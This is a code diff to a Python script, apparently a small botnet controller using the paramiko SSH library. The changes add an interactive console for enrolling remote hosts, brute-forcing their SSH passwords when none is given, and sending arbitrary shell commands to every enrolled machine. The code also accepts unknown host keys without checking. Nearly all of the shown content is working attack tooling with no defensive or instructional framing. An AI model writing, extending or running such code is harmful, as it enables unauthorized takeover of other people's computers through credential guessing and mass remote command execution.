@@ -12,6 +12,7 @@ def commandSHH(Host, port, username, password, command):
     ssh = paramiko.SSHClient()
 
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
     ssh.load_system_host_keys() 
     ssh.connect(Host, 22, username, password)
     sshin, shhout, ssherr = ssh.exec_command(command)
@@ -45,10 +46,14 @@ class bot:
                                 self.passwd = password
                                 self.port = port
                                 self.ssh = 1
-                            self = bot(host, user, password, 1, 22)
                             
                         except Exception as e:
                             print(password, "is not the password. Attempts:", passwordAttempts, e)
+                    try:
+                        self.ssh
+                    except:
+                        print("Could not find password.")
+                            
             else:
                 
                 if sendCommand(host, port, "cd"):
@@ -72,11 +77,25 @@ class bot:
                 print("Error with ip: {}, ".format(self.host), e)
             except:
                 print("There was an error while error handling...")
-memollenkamp = bot("192.168.1.11", "memol", "", False, 50007)
-botnet = [memollenkamp]
+
+botnet = []
 
 def commandBotnet(command):
     for computer in botnet:
         computer.botnetCommand(command)
 
-commandBotnet("ls")
+def main():
+    global botnet
+    command = ""
+    while command != "Quit":
+        command = input("Local>")
+        if command == "Botnet Console":
+            while input("Quit?") != "quit":
+                print("Botnet>")
+                commandBotnet(input())
+        elif command == "Botnet Add":
+            botnet += [bot(input("What is the hosts ip?\n"), input("Username"), input("Password (you can leave this blank for a brute force attack):"), 1, 22)]
+
+if __name__ == "__main__":
+    main()
+        
